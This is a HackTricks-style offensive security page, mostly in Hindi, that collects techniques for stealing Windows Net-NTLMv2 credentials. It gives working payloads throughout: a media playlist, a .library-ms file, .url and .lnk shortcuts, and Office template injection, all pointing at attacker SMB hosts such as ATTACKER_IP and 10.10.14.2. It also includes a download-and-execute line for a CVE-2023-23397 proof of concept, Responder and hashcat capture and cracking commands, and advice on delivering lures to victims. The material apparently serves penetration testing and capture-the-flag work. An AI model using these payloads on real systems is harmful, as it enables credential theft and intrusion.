# Places to steal NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**इन सभी बेहतरीन विचारों को देखें: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — ऑनलाइन डाउनलोड किए गए microsoft word file से लेकर ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md और [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player प्लेलिस्ट (.ASX/.WAX)

यदि आप अपने नियंत्रण में किसी target को Windows Media Player playlist खोलने या preview करने के लिए कह सकें, तो आप entry को एक UNC path की ओर इशारा कराकर Net‑NTLMv2 को leak कर सकते हैं। WMP संदर्भित मीडिया को SMB पर प्राप्त करने का प्रयास करेगा और implicitly authenticate कर देगा।

उदाहरण payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
संग्रह और cracking प्रवाह:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer जब ZIP आर्काइव के भीतर से सीधे .library-ms फाइलें खोली जाती हैं तो उन्हें असुरक्षित तरीके से हैंडल करता है। यदि library definition एक remote UNC path (उदा., \\attacker\share) की ओर इशारा करती है, तो ZIP के अंदर .library-ms को ब्राउज़/लॉन्च करने मात्र से Explorer उस UNC को एन्यूमेरेट करता है और हमलावर को NTLM authentication भेज देता है। इससे NetNTLMv2 प्राप्त होता है जिसे offline में क्रैक किया जा सकता है या संभावित रूप से relay किया जा सकता है।

न्यूनतम .library-ms जो हमलावर के UNC की ओर इशारा करती है
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- ऊपर दिए गए XML के साथ .library-ms फाइल बनाएं (अपना IP/hostname सेट करें).
- इसे ZIP करें (on Windows: Send to → Compressed (zipped) folder) और ZIP को target तक पहुँचाएं.
- एक NTLM capture listener चलाएँ और victim के ZIP के अंदर से .library-ms खोलने का इंतजार करें.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows calendar items में extended MAPI property PidLidReminderFileParameter को process करता था. अगर वह property किसी UNC path (e.g., \\attacker\share\alert.wav) की ओर इशारा करती थी, तो reminder के फायर होने पर Outlook SMB share से संपर्क करता और user का Net‑NTLMv2 बिना किसी क्लिक के leaking हो जाता था. इसे 14 मार्च 2023 को patch किया गया था, लेकिन यह legacy/untouched fleets और historical incident response के लिए अभी भी बहुत प्रासंगिक है.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener पक्ष:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
नोट्स
- पीड़ित के पास केवल उस समय Outlook for Windows चल रहा होना चाहिए जब रिमाइंडर ट्रिगर हो।
- यह leak Net‑NTLMv2 देता है, जो offline cracking या relay के लिए उपयुक्त है (pass‑the‑hash नहीं)।

### .LNK/.URL आधारित zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer शॉर्टकट आइकॉन स्वचालित रूप से रेंडर करता है। हालिया रिसर्च ने दिखाया कि Microsoft के April 2025 के UNC‑icon shortcuts के patch के बाद भी, शॉर्टकट target को UNC path पर होस्ट करके और आइकॉन को लोकल रखकर बिना किसी क्लिक के NTLM authentication ट्रिगर करना संभव था (patch bypass को CVE‑2025‑50154 असाइन किया गया)। केवल फोल्डर देखने भर से Explorer रिमोट target से metadata प्राप्त कर लेता है और attacker SMB server को NTLM भेज देता है।

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
प्रोग्राम शॉर्टकट payload (.lnk) PowerShell के माध्यम से:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
डिलीवरी के विचार
- shortcut को एक ZIP में डालें और लक्षित व्यक्ति को उसे ब्राउज़ करवाएँ।
- shortcut को उस writable share पर रखें जिसे लक्षित खोलेंगे।
- एक ही फ़ोल्डर में अन्य lure files के साथ मिलाएँ ताकि Explorer आइटम का पूर्वावलोकन करे।


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents बाहरी template को रेफर कर सकते हैं। यदि आप संलग्न template को UNC path पर सेट करते हैं, तो document खोलने पर SMB पर authenticate होगा।

न्यूनतम DOCX relationship changes (inside word/):

1) word/settings.xml संपादित करें और संलग्न template संदर्भ जोड़ें:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels को संपादित करें और rId1337 को अपने UNC की ओर इशारा करें:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx में पुन:पैक करें और भेजें। अपना SMB capture listener चलाएँ और open होने का इंतज़ार करें।

कैप्चर के बाद relaying या abusing NTLM के विचारों के लिए देखें:

{{#ref}}
README.md
{{#endref}}


## संदर्भ
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
